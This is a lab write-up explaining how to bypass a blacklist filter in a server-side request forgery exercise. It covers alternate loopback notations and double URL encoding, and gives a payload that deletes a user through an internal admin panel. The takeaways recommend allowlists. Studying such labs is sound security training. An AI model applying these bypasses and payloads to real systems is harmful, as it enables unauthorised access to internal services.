# Lab: SSRF with blacklist-based input filter

## Description
This lab contains a stock check feature that blocks specific keywords like `127.0.0.1` and `admin`. We need to bypass these filters to access the admin panel.

## Analysis
Blacklist-based filters are often weak and can be bypassed using various encoding or representation tricks.
- `127.0.0.1` can be represented as `127.1`, `2130706433` (decimal), or `017700000001` (octal).
- `admin` can be bypassed using case variations (if the filter is case-sensitive) or URL encoding.

## Exploitation
I will use double URL encoding to bypass the `admin` filter.

### Steps
1. Intercept the stock check request.
2. Try `http://127.1/`. If it works, try to access `/admin`.
3. If `/admin` is blocked, try `http://127.1/a%64min`.
4. If that's blocked, try double encoding the 'd': `http://127.1/a%2564min`.
5. Once in the admin panel, delete carlos.

## Payload
```text
stockApi=http://127.1/a%2564min/delete?username=carlos
```

## Takeaways
- Blacklists are inherently flawed as it's difficult to account for all possible bypasses.
- Double URL encoding is a common technique to bypass filters that only decode input once.
- Use a whitelist of allowed domains and protocols instead of a blacklist.
